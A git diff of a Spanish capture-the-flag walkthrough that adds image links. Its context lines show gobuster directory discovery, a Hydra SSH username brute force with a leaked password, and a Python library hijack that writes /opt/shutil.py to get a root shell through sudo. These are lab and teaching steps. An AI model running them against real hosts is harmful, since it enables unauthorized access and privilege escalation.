@@ -17,10 +17,10 @@ Al entrar a ```http://172.17.0.2/``` veremos la página default de apache, por l
 ```
 gobuster dir -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://172.17.0.2/ -x php,html
 ```
-![]()
+![dir discovery](images/img2.png)
 
 Descubrimos ```index.php``` el cuál, al hacerle un curl (o en su defecto entrar e inspeccionar) encontraremos un texto:
-![]()
+![cur](images/img3.png)
 ```
 <h1>JIFGHDS87GYDFIGD</h1>
 ```
@@ -31,14 +31,14 @@ Como ya tenemos la contraseña, nos interesa descubrir el usuario, por lo que ej
 ```
 hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD ssh://172.17.0.2 -I
 ```
-![]()
+![hydra user](images/img4.png)
 
 Y encontramos que el usuario es carlos. por lo que ahora podemos acceder con las credenciales completas al ssh ```ssh carlos@172.17.0.2```
-![]()
+![carlos](images/img5.png)
 
 ## Paso N4: Python Librarie Hijacking
 Al hacer ```sudo -l``` encontramos la ruta ```(ALL) NOPASSWD: /usr/bin/python3 /opt/script.py``` la cuál, nos dice  que podemos ejecutar servicio sudo en la ruta ```/usr/bin/python3``` y en la ruta ```/opt``` hay un archivo python ejecutable el cual contiene este script:
-![]()
+![script](images/img6.png)
 
 Podemos ver que el script corre ```import shutil``` sin la direccion completa y exacta del recurso (es decir, sin ruta absoluta), por lo que podemos abusar de ello usando un Python Librarie Hijacking.
 
@@ -46,7 +46,7 @@ Para esto, crearemos un archivo llamado ```shutil.py``` y haremos que ejecute el
 ```
 echo 'import os; os.system("/bin/bash")' > /opt/shutil.py
 ```
-![]()
+![script](images/img)
 
 Python Librarie Hijacking, consiste en una vulnerabilidad la cuál podemos aprovechar una declaracion ```import``` sin ruta absoluta, para correr un script propio con nombre el nombre de la declaracion import.
 
